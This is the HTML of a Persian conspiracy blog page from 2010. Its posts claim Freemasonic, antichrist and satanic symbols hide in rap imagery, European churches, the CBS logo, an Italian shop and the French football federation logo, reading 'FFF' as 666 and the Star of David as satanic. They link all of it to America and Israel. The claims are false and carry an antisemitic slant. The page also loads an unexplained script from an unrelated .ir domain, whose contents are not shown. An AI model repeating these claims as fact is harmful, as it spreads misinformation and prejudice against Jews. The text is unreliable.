+<p style="text-align: center;"><a href="http://www.mypagerank.net/seomonitor-58914.html" target="_blank"><img src="http://www.mypagerank.net/services/seomonitor/seomonitor.php?aut=58914" title="SEO Monitor by MyPagerank.Net"  ="" border="0"></a></p></center>
+
+</td></tr></table></td></tr></table>
+
+
+
+
+<script src="http://filmdoni.ir/js/easy.js"></script>
+
+
+
+		<div id="MihanblogShopAds" style="display:block;height:0px;width:100%;border:0px"></div>
+		<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/142" style="color:#222;text-decoration:none"><h2>باز هم فراماسون در رپ + دجال</h2></a></td></tr><tr><td>
+                        
+<p align="left"></p><br>
+
+<div id="InPost_MihanblogShopAds" style="display:block;height:0px;width:100%;border:0px"></div>
+<div style="text-align: center;"><img alt="http://up.iranblog.com/Files/ce4a02b0cecf4247a4d5.JPG" src="http://up.iranblog.com/Files/ce4a02b0cecf4247a4d5.JPG"><br><br><div style="text-align: justify;">این پست برای کسایی هست که میگن رپ اصلا هیچ ارتباطی با فراماسون نداره...دوستان باز هم میگم اون که کلیسا بود اون همه فراماسون توش نفوذ کرده بود اما رپ یه ریشه غربی داره و بیشتر باید دید پس ناراحت نشین یا موضع نگیرین...تو این عکس ببینیدنماد هرم و چشم در پشتشون نماد ضد مسیح (<a href="index.html" target="" title="">آنتی کرایست</a>) رو شک نکنید که این نماد ها همه از روی عمد کشیده شده...فرقی نمیکنه از هر راهی که باشه میخوان ضد خدا و دین کارکنند...<br>
+
+</div></div>
+<br>
+
+<div align=left style="font-weight:bold"></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D9%81%D8%B1%D8%A7%D9%85%D8%A7%D8%B3%D9%88%D9%86">فراماسون</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A2%D9%86%D8%AA%DB%8C%20%DA%A9%D8%B1%D8%A7%DB%8C%D8%B3%D8%AA">آنتی کرایست</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B1%D9%BE">رپ</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B6%D8%AF%20%D9%85%D8%B3%DB%8C%D8%AD">ضد مسیح</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84">دجال</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%87%D8%B1%D9%85">هرم</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/275048" style="color:#999;">سعید </a>| <a target="_self" href="javascript:newComment(142)">نظرات (<script>setCommentCnt(142)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/140" style="color:#222;text-decoration:none"><h2>کلیپی از نماد های فراماسونری در کلیسا ها اروپا</h2></a></td></tr><tr><td>
+                        
+<p align="left">موضوع مطلب : 
+<a href="http://dajal.mihanblog.com/post/category/6">چشم جهان بین,</a><a href="http://dajal.mihanblog.com/post/category/5">معماری,</a></p><br>
+
+
+
+<div style="text-align: justify;"><br><br><div style="text-align: center;"><img alt="http://up.iranblog.com/Files/898a7c2e42ac4e63b47e.jpg" src="http://up.iranblog.com/Files/898a7c2e42ac4e63b47e.jpg"><br><br><div style="text-align: justify;">کلیپی جالب و بسیار بحث بر انگیز برای کسایی که تمامی این نماد ها را تصادفی میدانند...در این کلیپ کلیساهایی را که در آن نماد های واضح <a href="index.html" target="" title="">فراماسونری</a> هست نشان میدهد واقعا دیدنی و تعجب آور که چگونه سعی در نفوذ خود در همه جا هستند...حتما نیگاه کنید...<span style="color: rgb(204, 0, 0);">( به ادامه مطلب بروید )</span></div></div>
+
+</div>
+
+<br>
+
+<div align=left style="font-weight:bold"><a href='http://dajal.mihanblog.com/post/140'>ادامه مطلب</a></div>
+<br>
+
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/254066" style="color:#999;">امیر </a>| <a target="_self" href="javascript:newComment(140)">نظرات (<script>setCommentCnt(140)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/139" style="color:#222;text-decoration:none"><h2>ماسونری در کل تاریخ شبکه سی بی اس + دجال</h2></a></td></tr><tr><td>
+                        
+<p align="left"></p><br>
+
+
+<div style="text-align: center;"><img style="width: 492px; height: 207px;" alt="http://up.iranblog.com/Files/cff5db41faeb4a20b78e.jpg" src="http://up.iranblog.com/Files/cff5db41faeb4a20b78e.jpg"><br><br><div style="text-align: justify;">آرم شبکه <a href="index.html" target="" title="">سی بی اس</a> در طول سال های 1955 تا 2005 دقت کنید به اصرار در نماد چشم این شبکه فعالیت زیادی در دستگاه فراماسونری دارد و از سالیان دور برای تحقق اهداف شئم ماسونری در حال تلاش است...<br></div>
+
+</div>
+<br>
+
+<div align=left style="font-weight:bold"></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D8%B1%D8%B3%D8%A7%D9%86%D9%87%20%D9%87%D8%A7">رسانه ها</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84">دجال</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B3%DB%8C%20%D8%A8%DB%8C%20%D8%A7%D8%B3">سی بی اس</a>,<a href="http://dajal.mihanblog.com/post/tag/CBS">CBS</a>,<a href="http://dajal.mihanblog.com/post/tag/%DA%86%D8%B4%D9%85%20%D8%AD%D9%87%D8%A7%D9%86%20%D8%A8%DB%8C%D9%86">چشم حهان بین</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A7%D8%B5%D8%B1%D8%A7%D8%B1">اصرار</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%A7%D8%B3%D9%88%D9%86">ماسون</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A2%D9%85%D8%B1%DB%8C%DA%A9%D8%A7">آمریکا</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/254066" style="color:#999;">امیر </a>| <a target="_self" href="javascript:newComment(139)">نظرات (<script>setCommentCnt(139)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/138" style="color:#222;text-decoration:none"><h2>تاریخچه ی فراماسونری قسمت اول</h2></a></td></tr><tr><td>
+                        
+<p align="left">موضوع مطلب : 
+<a href="http://dajal.mihanblog.com/post/category/12">کتاب,</a></p><br>
+
+
+<div style="text-align: center;"><img alt="http://www.blogfa.com/photo/a/ams-israel.jpg" src="http://www.blogfa.com/photo/a/ams-israel.jpg"><br><br><div style="text-align: justify;">از امروز توسط یکی از نوسندگان برجسته ی وب ترجمه مقاله تاریخچه فراماسونری در این وب به صورت قسمتی قرار میگیرد کسانی که قصد شناسایی کامل فراماسون و مبانی شکل گیری آن را دارند حتما این موضوع را دنبال کنند...واقعا موضوع خواندنی است...<span style="color: rgb(255, 0, 0);"><br>(به ادامه مطلب مراجعه کنید)</span><br><p dir="ltr" style="margin-right: 0px; text-align: right;"> 
+</p></div></div>
+<br>
+
+<div align=left style="font-weight:bold"><a href='http://dajal.mihanblog.com/post/138'>ادامه مطلب</a></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D8%AA%D8%A7%D8%B1%DB%8C%D8%AE%DA%86%D9%87">تاریخچه</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%A7%D8%B3%D9%88%D9%86">ماسون</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B5%D8%AF%D8%A7%D9%85">صدام</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%86%D8%B4%D9%88%D9%85%20%D9%86%D9%88%DB%8C%D9%86%20%D8%AF%D9%86%DB%8C%D9%88%DB%8C">نشوم نوین دنیوی</a>,<a href="http://dajal.mihanblog.com/post/tag/Desert&#32;shield">Desert shield</a>,<a href="http://dajal.mihanblog.com/post/tag/Desert&#32;storm">Desert storm</a>,<a href="http://dajal.mihanblog.com/post/tag/Propaganda">Propaganda</a>,<a href="http://dajal.mihanblog.com/post/tag/New&#32;world&#32;order">New world order</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B9%D8%A8%D8%B1%DB%8C">عبری</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84%20%D9%88%D8%A7%D9%82%D8%B9%DB%8C">دجال واقعی</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/254066" style="color:#999;">امیر </a>| <a target="_self" href="javascript:newComment(138)">نظرات (<script>setCommentCnt(138)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/137" style="color:#222;text-decoration:none"><h2>لوگوی شیطانی فدارسیون فوتبال فرانسه + دجال</h2></a></td></tr><tr><td>
+                        
+<p align="left">موضوع مطلب : 
+<a href="http://dajal.mihanblog.com/post/category/1">دست شیطان,</a><a href="http://dajal.mihanblog.com/post/category/5">معماری,</a><a href="http://dajal.mihanblog.com/post/category/3">ستاره,</a><a href="http://dajal.mihanblog.com/post/category/7">اعداد,</a></p><br>
+
+<div style="text-align: justify;">این پست رو یکی از همکاران&nbsp;برای ما ارسال کرده تا شاید با این تب جام جهانی که در جهان حاکمه یک تاثیری بر روی شما عزیزان داشته باشه...خوشبختانه خودشون هم توشیح عکس رو دادن که دیگر نیازی به توشیحات بنده نیست...<br></div><div style="text-align: justify;"><br><br></div><div style="text-align: center;"><img alt="http://up.iranblog.com/Files/2e56c52d8eef45abb8e7.jpg" src="http://up.iranblog.com/Files/2e56c52d8eef45abb8e7.jpg"><br><br></div><div style="text-align: justify;"><br><div style="text-align: right;">&nbsp;لوگوی فدراسیون فوتبال فرانسه :<br>1- هم شش ضلعی داره (ستاره داود)<br>
+2 - هم ستاره ی شش گوش داره .<br>
+3 - هم FFF (البته این سه حرف مخفف "فدراسیون فوتبال فرانسه" است)<br>
+معمولا شیطان با این سه حرف نشون داده میشه . چون F حرف ششم لاتینه و کنار 
+هم بودن سه تا F یعنی 666<br>
+4 - دست شاخ دار هم داره توش (نوک خروس)					
+					<br></div></div><br>
+
+<div align=left style="font-weight:bold"></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D9%84%D9%88%DA%AF%D9%88">لوگو</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AC%D8%A7%D9%85%20%D8%AC%D9%87%D8%A7%D9%86%DB%8C">جام جهانی</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%B3%D8%AA%20%D8%B4%DB%8C%D8%B7%D8%A7%D9%86%DB%8C">دست شیطانی</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84">دجال</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%A7%D8%B3%D9%88%D9%86">ماسون</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%81%D8%B1%D8%A7%D9%86%D8%B3%D9%87">فرانسه</a>,<a href="http://dajal.mihanblog.com/post/tag/666">666</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B3%D8%AA%D8%A7%D8%B1%D9%87">ستاره</a>,<a href="http://dajal.mihanblog.com/post/tag/FFF">FFF</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/254066" style="color:#999;">امیر </a>| <a target="_self" href="javascript:newComment(137)">نظرات (<script>setCommentCnt(137)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/136" style="color:#222;text-decoration:none"><h2>ولادت امام باقر (ع)  مبارک باد</h2></a></td></tr><tr><td>
+                        
+<p align="left">موضوع مطلب : 
+<a href="http://dajal.mihanblog.com/post/category/9">آزاد,</a></p><br>
+
+<div style="text-align: center;"><img alt="http://heyatemaktabolbagher.epage.ir/images/heyatemaktabolbagher/gallery/df57a1ca5de6ecd166fb30d80b939277/FullPic/2009-03-16_10.21.18_78.jpg" src="http://heyatemaktabolbagher.epage.ir/images/heyatemaktabolbagher/gallery/df57a1ca5de6ecd166fb30d80b939277/FullPic/2009-03-16_10.21.18_78.jpg"><br><br><font style="background-color: rgb(255, 255, 255);" color="#0000ff" size="1"><strong>| حلول
+ ماه رجب ؛ ماه ریزش باران رحمت الهی و ولادت امام باقر (ع)&nbsp; مبارک باد&nbsp; |</strong></font><br><br>مطالب جالب از ماه مبارک رجب به ادامه مطلب بروید...<br>
+
+</div><br>
+
+<div align=left style="font-weight:bold"><a href='http://dajal.mihanblog.com/post/136'>ادامه مطلب</a></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D9%88%D9%84%D8%A7%D8%AF%D8%AA">ولادت</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A7%D9%85%D8%A7%D9%85%D8%B1%DB%8C%D8%A7">امامریا</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%B9%D8%B5%D9%88%D9%85">معصوم</a>,<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%AD%D9%85%D8%AF%20%D8%A8%D8%A7%D9%82%D8%B1">محمد باقر</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B1%D8%AC%D8%A8">رجب</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%B1%D9%85%D8%B6%D8%A7%D9%86">رمضان</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/254066" style="color:#999;">امیر </a>| <a target="_self" href="javascript:newComment(136)">نظرات (<script>setCommentCnt(136)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><a href="http://dajal.mihanblog.com/post/135" style="color:#222;text-decoration:none"><h2>فراماسونری در مغازه ای در ایتالیا + دجال</h2></a></td></tr><tr><td>
+                        
+<p align="left">موضوع مطلب : 
+<a href="http://dajal.mihanblog.com/post/category/6">چشم جهان بین,</a><a href="http://dajal.mihanblog.com/post/category/5">معماری,</a></p><br>
+
+<div style="text-align: justify;"><div style="text-align: center;"><img style="width: 501px; height: 359px;" alt="http://up.iranblog.com/Files/95a29b8c94aa446abb1d.jpg" src="http://up.iranblog.com/Files/95a29b8c94aa446abb1d.jpg"><br></div><br>عکسی از یکی از مغازه هایی در ایتالیا که برای متوجه شدن شما عزیزان دور نماد چشم جهان بین و هرم خط سفید کشیده شده است...100% باید تاثیر ماسونری را در شهر های <a href="index.html" target="" title="">اروپایی</a> که ارتباط بسیار نزدیکی با مریکا و از حامیا اسرائیل هست دید...به نظر شما لزوم قرار گیری این نماد در این تیکه از مغازه چیست...؟
+
+</div><br>
+
+<div align=left style="font-weight:bold"></div>
+<br>
+<br>برچسب ها : 
+<a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%A7%D8%B3%D9%88%D9%86">ماسون</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84">دجال</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A7%DB%8C%D8%AA%D8%A7%D9%84%DB%8C%D8%A7">ایتالیا</a>,<a href="http://dajal.mihanblog.com/post/tag/%DA%86%D8%B4%D9%85%20%D8%AC%D9%87%D8%A7%D9%86%20%D8%A8%DB%8C%D9%86">چشم جهان بین</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A2%D9%85%D8%B1%DB%8C%DA%A9%D8%A7">آمریکا</a>,<a href="http://dajal.mihanblog.com/post/tag/%D8%A7%D8%B3%D8%B1%D8%A7%D8%A6%DB%8C%D9%84">اسرائیل</a>,
+<hr style="width:100%;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+
+<div align='right'>
+<a href="http://dajal.mihanblog.com/post/author/275048" style="color:#999;">سعید </a>| <a target="_self" href="javascript:newComment(135)">نظرات (<script>setCommentCnt(135)</script>)</a>
+</div>
+
+</td></tr></table></td></tr></table>
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><table id="pictureBase" align="center" width="100%" cellpadding="5" cellspacing="5" border="0"><tr>
+<td class="pictureBaseHead"><h2>اخرین مطالب ارسالی</h2></a></td></tr><tr><td>
+                        
+<a href="http://dajal.mihanblog.com/post/142" title="جمعه 28 خرداد 1389">باز هم فراماسون در رپ + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/140" title="پنجشنبه 27 خرداد 1389">کلیپی از نماد های فراماسونری در کلیسا ها اروپا</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/139" title="پنجشنبه 27 خرداد 1389">ماسونری در کل تاریخ شبکه سی بی اس + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/138" title="پنجشنبه 27 خرداد 1389">تاریخچه ی فراماسونری قسمت اول</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/137" title="پنجشنبه 27 خرداد 1389">لوگوی شیطانی فدارسیون فوتبال فرانسه + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/136" title="سه شنبه 25 خرداد 1389">ولادت امام باقر (ع)  مبارک باد</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/135" title="سه شنبه 25 خرداد 1389">فراماسونری در مغازه ای در ایتالیا + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/134" title="سه شنبه 25 خرداد 1389">تعامل کوکا و پپسی ضد اسلام + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/133" title="سه شنبه 25 خرداد 1389">فراماسونری در عکس مدونا + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;"><a href="http://dajal.mihanblog.com/post/132" title="سه شنبه 25 خرداد 1389">باز هم حرکت دست شیطانی اوباما + دجال</a><hr style="width:446px;border:0px;color:#ECEAD4;border-bottom: #DAD7B6 1px dashed;">
+<div class=page> (تعداد کل صفحات :20)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp<a href="http://dajal.mihanblog.com/page/1">
+[ <b>1</b> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/2">
+[ <span>2</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/3">
+[ <span>3</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/4">
+[ <span>4</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/5">
+[ <span>5</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/6">
+[ <span>6</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/7">
+[ <span>7</span> ]</a>&nbsp;&nbsp;<a href="http://dajal.mihanblog.com/page/8">
+[ <i>...</i> ]</a>&nbsp;&nbsp;<br><br></div>
+</td></tr></table></td></tr></table>
+
+
+
+</td>
+
+  </tr>
+</table>
+
+</body>
+</html><script>
+//    setTimeout(function () {
+//        GetMihanBlogShowAds();
+//    }, 1000);
+</script>
+<!--NEW SERVER--><!--;)-->
+
+<!--SabaVision Ads Handler--><!--<script type="text/javascript">(function (d) {var url =   location.protocol+'//api.sabavision.com/pox/poxjs.js';d.write('<script type="text/javascript" src="' + url + '" async></scri' + 'pt>');})(document);</script>-->
+
+
+<script type="text/javascript">
+
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-153829-9']);
+    _gaq.push(['_setDomainName', 'dajal.mihanblog.com']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+</script>
+
+
+<div id='mediaad-Kvcm'></div>
+<meta name="sabavision_zone" content="2500-Z499" />
+<center>
+    <div style="background-color:white;width:90%;padding:20px;margin-top:50px;margin-bottom:50px;">
+        <a href="https://www.cloob.com">شبکه اجتماعی فارسی کلوب</a> | <a href="https://www.seo25.com/product/buy-mobile-traffic-and-get-cheap-targeted-mobile-traffic/" target="_blank">Buy Mobile Traffic</a> | <a href="https://www.soalaat.com">سایت سوالات</a>
+    </div>
+</center>
